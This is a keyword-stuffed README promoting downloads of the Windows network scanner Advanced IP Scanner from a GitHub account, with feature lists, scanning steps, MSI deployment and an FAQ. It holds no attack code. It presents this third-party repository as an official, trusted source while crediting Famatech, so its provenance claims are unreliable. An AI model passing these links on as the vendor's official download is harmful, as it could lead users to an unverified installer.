# Advanced IP Scanner — Free Network Scanner for Windows

Discover every device on your LAN in seconds.  
**Fast, portable, and free** — the best **IP scanner for Windows** to scan local networks, find connected devices, and manage remote PCs. No cloud upload, no account required.

[![Latest Release](https://img.shields.io/github/v/release/netscan-tools/advanced-ip-scanner?label=Download&style=flat-square)](https://github.com/netscan-tools/advanced-ip-scanner/releases/latest)
[![Windows](https://img.shields.io/badge/Windows-7%20%7C%208%20%7C%2010%20%7C%2011-0078D4?style=flat-square&logo=windows&logoColor=white)](https://github.com/netscan-tools/advanced-ip-scanner/releases/latest)
[![License](https://img.shields.io/badge/License-Free-green?style=flat-square)](https://github.com/netscan-tools/advanced-ip-scanner)
[![MSI](https://img.shields.io/badge/Installer-MSI-blue?style=flat-square)](https://github.com/netscan-tools/advanced-ip-scanner/releases/latest)

**Keywords:** free network scanner · LAN IP scanner · Windows network discovery tool · MAC address scanner · subnet scanner · Wi‑Fi device finder · Wake-on-LAN · remote desktop scanner · free IP scanner download

---

## Table of contents

- [Download](#download)
- [What it does](#what-it-does)
- [What is Advanced IP Scanner?](#what-is-advanced-ip-scanner)
- [Who should use it](#who-should-use-it)
- [Features](#features)
- [How it works](#how-it-works)
- [How to scan your network](#how-to-scan-your-network)
- [Find devices on Wi‑Fi / LAN](#find-devices-on-wi-fi--lan)
- [Remote control and administration](#remote-control-and-administration)
- [Corporate deployment (MSI)](#corporate-deployment-msi)
- [Screenshots](#screenshots)
- [Quick start](#quick-start)
- [System requirements](#system-requirements)
- [Use cases](#use-cases)
- [Advanced IP Scanner vs alternatives](#advanced-ip-scanner-vs-alternatives)
- [FAQ](#faq)
- [Glossary](#glossary)
- [Summary](#summary)
- [Support](#support)

---

## Download

| Platform | Installer |
|----------|-----------|
| Windows 7 / 8 / 10 / 11 (32-bit & 64-bit) | [**Advanced_IP_Scanner_2.5.4594.1.msi**](https://github.com/netscan-tools/advanced-ip-scanner/releases/download/Advanced_IP_Scanner_2.5.4594.1/Advanced_IP_Scanner_2.5.4594.1.msi) |

> **Free** for personal and commercial use. No registration, no subscription, no telemetry required to scan.

**Direct download:** [Advanced_IP_Scanner_2.5.4594.1.msi](https://github.com/netscan-tools/advanced-ip-scanner/releases/download/Advanced_IP_Scanner_2.5.4594.1/Advanced_IP_Scanner_2.5.4594.1.msi)  
**All releases:** [github.com/netscan-tools/advanced-ip-scanner/releases](https://github.com/netscan-tools/advanced-ip-scanner/releases/latest)

---

## What it does

**Advanced IP Scanner** is a free, fast, and portable **network scanner for Windows**. It scans **local area networks (LAN)** and **Wi‑Fi subnets** to detect all connected devices — computers, printers, routers, NAS, phones, IoT cameras, smart TVs, and more.

For each host it can show:

- **IP address** (IPv4)
- **MAC address** and **hardware vendor** (OUI lookup)
- **Hostname** / NetBIOS name
- **Operating system** hints where detectable
- **Shared folders** (SMB/CIFS)
- **FTP, HTTP, HTTPS** services on discovered hosts
- **Online / offline** status and response time

Ideal for anyone searching for a **free LAN scanner**, **IP range scanner**, or **network inventory tool** on Windows without learning command-line tools like `nmap` or `arp -a`.

---

## What is Advanced IP Scanner?

**Advanced IP Scanner** (by Famatech) is one of the most downloaded **free network discovery utilities** for Microsoft Windows. Unlike heavy enterprise suites, it focuses on a single job: **find every device on your network quickly** and give you one-click access to remote administration.

Common search queries this tool answers:

| You want to… | Advanced IP Scanner helps by… |
|--------------|-------------------------------|
| See who is on my Wi‑Fi | Scanning `192.168.0.0/24` or `192.168.1.0/24` |
| List all IPs on LAN | Scanning a custom range like `10.0.0.1–254` |
| Get MAC address from IP | Showing MAC + vendor per live host |
| Wake a PC remotely | **Wake-on-LAN (WOL)** from scan results |
| Open RDP to a machine | Launching **Remote Desktop** in one click |
| Export network inventory | **CSV export** for audits and documentation |
| Scan without installing | **Portable mode** from USB |

The **MSI installer** on this repository is suitable for home users, IT departments, and MSPs who need silent deployment via **GPO, SCCM, or Intune**.

---

## Who should use it

- **Home users** — check unknown devices on home Wi‑Fi, find printer IP, see smart-home gadgets
- **Network administrators** — LAN inventory, subnet documentation, quick health checks
- **IT support / helpdesk** — locate PCs by IP, hostname, or MAC before remote support
- **System administrators** — Wake-on-LAN, shutdown, restart, RDP/Radmin from one list
- **Small business** — free alternative to paid IP scanners for offices under 255 hosts per subnet
- **Students & labs** — learn TCP/IP, ARP, and LAN topology with a visual tool

---

## Features

- **Fast LAN scanning** — discover all devices on your network within seconds across any specified IP range
- **Subnet & IP range scanner** — scan `192.168.1.1–255`, `10.0.0.0/24`, or import a custom list from file
- **Remote access to shared folders** — browse shared resources including FTP, HTTP, and HTTPS services directly from scan results
- **Device identification** — detect MAC address, hardware vendor, hostname, and operating system information for each device
- **MAC address lookup** — identify manufacturer from OUI (useful for spotting unknown hardware)
- **Remote power management** — send Wake-on-LAN, shutdown, and restart commands to networked PCs
- **Remote desktop integration** — launch RDP or Radmin sessions to any discovered device
- **Portable mode** — run without installation from a USB drive or any directory
- **Favorites list** — save frequently accessed devices for quick targeted scans
- **Export results** — save scan reports in CSV format for documentation and auditing
- **Multi-language UI** — widely used internationally
- **Lightweight** — small footprint, runs on older Windows versions
- **No account** — scan immediately after install

---

## How it works

Advanced IP Scanner sends **ICMP ping** and **TCP probes** across the IP range you define. Live hosts respond; the application resolves names via **NetBIOS/DNS** where possible and enriches results with **MAC/vendor** data on the local segment.

Typical workflow:

1. **Define range** — e.g. full subnet `192.168.1.1–255` or single IP
2. **Scan** — multi-threaded discovery (fast on gigabit LANs)
3. **Review** — sortable table: IP, name, manufacturer, status, shared resources
4. **Act** — RDP, shared folders, WOL, shutdown, or export to CSV

You can fine-tune behavior from the main window: limit address range, adjust scan speed, or filter results — all without editing registry or firewall rules manually.

---

## How to scan your network

### Scan a single IP address

1. Paste the target IP (e.g. `192.168.1.105`) into the entry field at the top.
2. Click **Scan**.
3. Review: MAC address, hostname, vendor, open ports/services, online status.

### Scan full subnet (most common)

1. Enter range `192.168.1.1–255` (or your router’s subnet).
2. Click **Scan**.
3. Wait a few seconds — all replying hosts appear in the list.

### Scan multiple IP addresses from file

1. Create a `.txt` file with one IP or range per line.
2. Import into Advanced IP Scanner.
3. Start scan — detailed report per entry.

### Scan only favorites

Mark servers, printers, or workstations as **Favorites** and run targeted rescans without scanning the entire LAN — useful for monitoring critical endpoints daily.

---

## Find devices on Wi‑Fi / LAN

Wondering **“who is connected to my router?”** or **“how to find all devices on my network Windows 10/11?”**:

1. Open Command Prompt → `ipconfig` → note **Default Gateway** (e.g. `192.168.0.1`).
2. Your PC’s IP shows the subnet (e.g. `192.168.0.x` → scan `192.168.0.1–255`).
3. Run Advanced IP Scanner on that range.
4. Compare results with devices you own — unknown IPs/MACs may be guests or intruders.

**Tip:** Export CSV and label known devices (phone, laptop, printer) for a simple **home network inventory**.

---

## Remote control and administration

When paired with **Radmin** or Windows **Remote Desktop Protocol (RDP)**, Advanced IP Scanner becomes a lightweight **remote administration hub**:

- Initiate **remote desktop** sessions directly from scan results
- Send **shutdown**, **restart**, and **Wake-on-LAN** to networked computers
- Browse **shared folders**, documents, images, and media on remote machines
- Access **FTP** and **HTTP** services discovered during the scan

Portable mode means technicians can carry the scanner on a USB stick and manage client networks without leaving a full install on every machine.

---

## Corporate deployment (MSI)

The [**MSI package**](https://github.com/netscan-tools/advanced-ip-scanner/releases/download/Advanced_IP_Scanner_2.5.4594.1/Advanced_IP_Scanner_2.5.4594.1.msi) supports:

| Method | Benefit |
|--------|---------|
| **Group Policy (GPO)** | Push to domain workstations |
| **SCCM / ConfigMgr** | Enterprise software catalog |
| **Microsoft Intune** | Cloud-managed Windows fleet |
| **Silent install** | `msiexec /i Advanced_IP_Scanner_2.5.4594.1.msi /qn` |
| **Standard uninstall** | Apps & Features / Settings |

Why IT teams choose MSI over portable EXE: predictable install path, versioning, and compliance-friendly deployment.

---

## Screenshots

| Main window | Scan results |
|-------------|--------------|
| `docs/screenshots/main.png` | `docs/screenshots/results.png` |

---

## Quick start

1. Download [**Advanced_IP_Scanner_2.5.4594.1.msi**](https://github.com/netscan-tools/advanced-ip-scanner/releases/download/Advanced_IP_Scanner_2.5.4594.1/Advanced_IP_Scanner_2.5.4594.1.msi).
2. Run the installer (per-user or per-machine).
3. Launch **Advanced IP Scanner**.
4. Enter IP range → **Scan**.
5. Double-click a host for shared folders or right-click for RDP / WOL / power options.
6. **File → Export** → CSV for your network documentation.

---

## System requirements

| Requirement | Details |
|-------------|---------|
| OS | Windows 7 / 8 / 10 / 11 (32-bit and 64-bit) |
| Price | **Free** (personal & commercial) |
| Languages | Multiple languages supported |
| Installation | MSI installer (GPO / SCCM / Intune friendly) |
| Network | Local LAN / Ethernet / Wi‑Fi |
| Permissions | Standard user; admin may be needed for some remote actions |
| Disk | ~20 MB |
| RAM | Minimal (suitable for older PCs) |

---

## Use cases

- **Network inventory** — catalog PCs, printers, APs, NAS, and IoT on corporate LAN
- **Troubleshooting** — find IP conflicts, offline hosts, wrong subnet devices
- **Security auditing** — spot unknown MAC addresses; baseline before/after guest access
- **IT administration** — RDP, shared folders, WOL across office subnets
- **Home networking** — see phones, consoles, smart TVs on home Wi‑Fi
- **Printer setup** — discover printer IP when driver asks for address
- **Lab & classroom** — teach IPv4, subnets, and host discovery visually
- **MSP onsite visits** — portable scan of client network in minutes

---

## Advanced IP Scanner vs alternatives

| Feature | Advanced IP Scanner | Angry IP Scanner | Nmap | Fing |
|---------|---------------------|------------------|------|------|
| Windows GUI | ✅ Native | ✅ Java | ❌ CLI primary | ✅ App |
| Free | ✅ | ✅ Open source | ✅ | Freemium |
| MAC vendor | ✅ | Limited | ✅ | ✅ |
| RDP / Radmin integration | ✅ | ❌ | ❌ | Limited |
| Wake-on-LAN | ✅ | ❌ | Scripts | ✅ |
| Shared folder browse | ✅ | ❌ | ❌ | ❌ |
| CSV export | ✅ | ✅ | ✅ | ✅ |
| Portable (no install) | ✅ | ✅ | ✅ | ❌ |
| MSI enterprise deploy | ✅ (this release) | ❌ | ❌ | ❌ |
| Learning curve | Low | Low | High | Low |

### Other tools people compare

- **Fing** — mobile-first network scanner with device recognition
- **Angry IP Scanner** — open-source cross-platform IP and port scanner
- **Bopup Scanner** — lightweight scanner for Windows environments
- **Wireless Network Scanner** — Wi‑Fi–focused discovery
- **Nmap** — advanced port scanning and security auditing
- **SoftPerfect Network Scanner** — multi-protocol scanner (paid features)
- **Lansweeper / PRTG** — enterprise asset management (paid, heavier)

For **quick free LAN discovery on Windows** with **remote admin hooks**, Advanced IP Scanner remains a top choice.

---

## FAQ

**Is Advanced IP Scanner really free?**  
Yes. Free for personal and commercial use. No paid tier required to scan.

**Advanced IP Scanner download — where is the official MSI?**  
[Direct MSI link](https://github.com/netscan-tools/advanced-ip-scanner/releases/download/Advanced_IP_Scanner_2.5.4594.1/Advanced_IP_Scanner_2.5.4594.1.msi) · [All releases](https://github.com/netscan-tools/advanced-ip-scanner/releases/latest)

**Does it work on Windows 10 and Windows 11?**  
Yes. Fully supported on Windows 10 and 11 (64-bit and 32-bit).

**Does it require internet?**  
No for scanning. Internet is only needed to download the installer. All discovery runs on your local network.

**How to find all devices connected to my Wi‑Fi?**  
Scan your router’s subnet (usually `192.168.0.1–255` or `192.168.1.1–255`). See [Find devices on Wi‑Fi / LAN](#find-devices-on-wi-fi--lan).

**Can I get MAC address from an IP?**  
Yes, for hosts on the same LAN segment (ARP). The scanner displays MAC and vendor.

**Can I run it without installing?**  
Yes. Portable mode runs from USB or any folder without MSI install.

**Does it scan ports like Nmap?**  
It focuses on host discovery and common services (FTP/HTTP/shared folders), not deep port enumeration. Use Nmap for full port audits.

**Can I export scan results?**  
Yes. Export to **CSV** for spreadsheets, audits, and documentation.

**What is Wake-on-LAN and does it support it?**  
WOL sends a magic packet to wake sleeping PCs. Advanced IP Scanner can send WOL from the device list if the target NIC supports it.

**RDP from scanner — how?**  
Right-click a live Windows host → connect via **Remote Desktop** (if RDP enabled on target).

**Is it safe / does it upload my network data?**  
Scanning is local. No cloud account is required. (Always download from trusted sources — this GitHub release or official Famatech site.)

**Why MSI instead of EXE?**  
MSI supports **silent install**, **GPO**, **SCCM**, **Intune**, and clean uninstall via Windows Settings.

**Advanced IP Scanner vs Angry IP Scanner?**  
Angry IP Scanner is great for cross-platform ping sweeps. Advanced IP Scanner adds **RDP, Radmin, WOL, shared folders**, and **MSI deployment** — better for Windows IT workflows.

**IP scanner for local network — best free option?**  
For Windows GUI users, Advanced IP Scanner is among the most popular free choices worldwide.

**Scan 192.168.1.1–255 — how long does it take?**  
Typically seconds on a /24 LAN depending on hardware and firewall settings.

**Does it work on VPN?**  
It scans the network interface you’re connected to. VPN routing may limit which subnets are visible.

**Russian / multilingual interface?**  
Yes. Multiple UI languages are supported in the official product.

---

## Glossary

| Term | Meaning |
|------|---------|
| **LAN** | Local Area Network — your office or home network behind a router |
| **Subnet** | A range of IPs (e.g. 256 addresses in `192.168.1.0/24`) |
| **IP scanner** | Software that finds active hosts in an IP range |
| **MAC address** | Hardware address of a network interface (48-bit) |
| **OUI / Vendor** | First part of MAC identifying manufacturer |
| **ARP** | Protocol mapping IP addresses to MAC on local segment |
| **RDP** | Remote Desktop Protocol — remote control for Windows |
| **WOL** | Wake-on-LAN — power on PCs over the network |
| **SMB / Shared folder** | Windows file sharing (`\\host\share`) |
| **CSV export** | Comma-separated file for Excel and reporting |

---

## Summary

**Advanced IP Scanner** is a practical, efficient, and **free network scanner for Windows** for anyone who needs to **discover devices on a LAN**, **find IP and MAC addresses**, **export network inventory**, and **manage remote PCs** via RDP and Wake-on-LAN. Its **portable mode**, **straightforward GUI**, **MSI installer for enterprise**, and integration with remote-control tools make it an essential part of any **network troubleshooting** and **IT administration** toolkit.

**Download now:** [Advanced_IP_Scanner_2.5.4594.1.msi](https://github.com/netscan-tools/advanced-ip-scanner/releases/download/Advanced_IP_Scanner_2.5.4594.1/Advanced_IP_Scanner_2.5.4594.1.msi)

---

## Support

- [Releases](https://github.com/netscan-tools/advanced-ip-scanner/releases)
- [Issues](https://github.com/netscan-tools/advanced-ip-scanner/issues)
- Official site: [advanced-ip-scanner.com](https://www.advanced-ip-scanner.com/)
- Developer: Famatech Corp.

---

*Advanced IP Scanner, LAN scanner, IP scanner Windows, free network scanner download, network discovery tool, MAC address scanner, subnet scanner, Wi‑Fi device finder, Wake-on-LAN tool, remote desktop network scanner, 192.168.1.1 scan, find devices on network Windows, network inventory software free.*
